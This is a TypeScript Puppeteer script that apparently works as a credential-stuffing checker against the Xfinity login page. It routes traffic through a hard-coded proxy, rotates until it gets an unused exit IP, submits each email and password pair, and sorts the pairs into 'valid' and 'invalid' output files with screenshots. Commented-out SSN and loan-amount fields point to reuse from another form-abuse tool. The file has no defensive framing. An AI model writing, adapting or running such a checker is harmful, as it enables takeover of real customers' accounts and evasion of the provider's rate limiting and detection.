import axios from 'axios';
import ip from 'ip';
import pupeeteer, { Browser } from 'puppeteer';
import { Credential } from './interface/credential';
import {
  LOAN_AMOUNTS,
  TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
  TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES,
} from './constants';
import {
  generateOutputMessage,
  getRamdomValue,
  minutesToMilliseconds,
} from './utils';
import path from 'path';
import fs from 'fs';
import logger from './logger/logger';

export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
  TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
);

export const TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MILLISECONDS =
  minutesToMilliseconds(TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES);

export const SCREENSHOT_DISABLED = true;

const logTracking = (message: string, email: string) => {
  logger.warn(`${message} || ${email}`);
};

const getLoanAmountValue = () =>
  LOAN_AMOUNTS[getRamdomValue(0, LOAN_AMOUNTS.length - 1)];

interface PageConfiguration {
  pageUrl: string;
  loanAmountSelector: string;
  formSelector: string;
}

interface ConfigurationPerPage {
  xfinity: PageConfiguration;
}

const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
  xfinity: {
    pageUrl: 'https://login.xfinity.com/login',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
};

const SELECTORS = {
  emailInput: '#user',
  password: '#passwd',
  submitButton: '#sign_in',
  userHint: '#user-hint',
  passwdHint: '#passwd-hint',
};

const proxyConfig = {
  host: '162.244.132.210',
  port: 6022,
};

const getIP = async () => {
  try {
    const { data: ip } = await axios.get<string>('https://api.ipify.org', {
      proxy: {
        protocol: 'http',
        host: proxyConfig.host,
        port: proxyConfig.port,
      },
    });
    return ip;
  } catch (error) {
    logger.error(error);
    // defualt ip when request fails
    return '127.0.0.1';
  }
};

const validateIp = async (
  ip: string,
  pageConfigKey: keyof ConfigurationPerPage,
) => {
  const IPs_Directory = path.join(`${__dirname}/data/ips`);

  if (!fs.existsSync(IPs_Directory)) {
    fs.mkdirSync(IPs_Directory, { recursive: true });
  }

  const readFile = async () => {
    if (!fs.existsSync(`${IPs_Directory}/${pageConfigKey}.txt`)) {
      fs.writeFileSync(`${IPs_Directory}/${pageConfigKey}.txt`, '', 'utf8');
    }

    const fileContent = await fs.promises.readFile(
      `${IPs_Directory}/${pageConfigKey}.txt`,
      'utf8',
    );

    return fileContent;
  };

  const fileData = await readFile();

  const ipsData = fileData ? fileData.split(/\n/).filter(Boolean) : [];

  const isIPUsed = [...ipsData, '127.0.0.1'].includes(ip);

  if (!isIPUsed) {
    logger.warn(`New IP: ${ip}`);

    ipsData.push(ip);

    fs.writeFileSync(
      `${IPs_Directory}/${pageConfigKey}.txt`,
      ipsData.join('\n'),
      'utf8',
    );
  }

  return isIPUsed;
};

export const getCredentialInformationScrapper = async (
  browser: Browser,
  credential: Credential,
  validWriteLineOnFile: (line: string) => void,
  invalidWriteLineOnFile: (line: string) => void,
  validFileName: string,
  pageConfigKey: keyof ConfigurationPerPage,
) => {
  const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];

  const HEADLESS = false;

  let _browser = await pupeeteer.launch({
    headless: HEADLESS,
    // headless: false,
    args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
  });

  // const page = await browser.newPage();
  let page = await _browser.newPage();

  await page.setViewport({
    width: 1920,
    height: 1080,
  });

  let ip = '';

  let isInvalidIp = true;

  try {
    await page.goto(pageUrl, {
      waitUntil: 'networkidle2',
    });

    while (isInvalidIp) {
      ip = await getIP();

      isInvalidIp = await validateIp(ip, pageConfigKey);

      if (isInvalidIp) {
        console.log(`CURRENT IP: ${ip}`);
      }
      await _browser.close();

      _browser = await pupeeteer.launch({
        headless: HEADLESS,
        // headless: false,
        args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
      });

      page = await _browser.newPage();

      await page.setViewport({
        width: 1920 / 1.5,
        height: 1080 / 1.5,
      });

      await page.goto(pageUrl, {
        waitUntil: 'networkidle2',
      });

      await new Promise((r) => setTimeout(r, 3000));
    }

    // console.log('out of loop');

    const screenshotRedirectDirectory = path.join(
      `${__dirname}/data/screenshots-redirect/${validFileName}`,
    );

    if (!fs.existsSync(screenshotRedirectDirectory)) {
      fs.mkdirSync(screenshotRedirectDirectory, { recursive: true });
    }

    const screenshotRedirectPath = path.join(
      `${screenshotRedirectDirectory}/${credential.email}.png`,
    );

    // await page.select(loanAmountSelector, loanAmountValue);

    // TODO: Add logic to select a loan amount

    // await page.type(SELECTORS.lastNameInput, credential.lastname);

    // await page.type(SELECTORS.firstNameInput, credential.name);

    await page.type(SELECTORS.emailInput, credential.email);

    // await page.type(SELECTORS.ssnInput, credential.last4ssn);

    await Promise.all([
      await page.click(SELECTORS.submitButton),
      await page.waitForNavigation({
        timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
        waitUntil: 'networkidle0',
      }),
    ]);

    await new Promise((r) => setTimeout(r, 1000));

    const passwordInput = await page.$(SELECTORS.password);

    // true if email is valid and password input exist else invalid
    if (passwordInput) {
      await page.type(SELECTORS.password, credential.password);

      await Promise.all([
        await page.click(SELECTORS.submitButton),
        await page.waitForNavigation({
          timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
          waitUntil: 'networkidle0',
        }),
      ]);

      // true if password is valid else invalid
      if (page.url().includes('auth')) {
        const outputMessage = generateOutputMessage(credential, page.url(), ip);

        logger.info(outputMessage);

        validWriteLineOnFile(outputMessage);
      } else {
        const outputMessage = generateOutputMessage(credential, page.url(), ip);

        logger.error(outputMessage);

        invalidWriteLineOnFile(outputMessage);
      }
    } else {
      const outputMessage = generateOutputMessage(credential, page.url(), ip);

      logger.error(outputMessage);

      invalidWriteLineOnFile(outputMessage);
    }

    if (SCREENSHOT_DISABLED) {
      await page.screenshot({
        path: screenshotRedirectPath,
      });
    }
  } catch (error) {
    console.error(error);
    logTracking(
      `ERROR WITH ${credential.email}!!!`,
      `${credential.email} || url=${page.url()} `,
    );

    logger.error(
      `getCredentialInformationScrapper ERROR: ${error} || EMAIL:${
        credential.email
      } || URL: ${page.url()}`,
    );
  } finally {
    await _browser.close();
  }
};
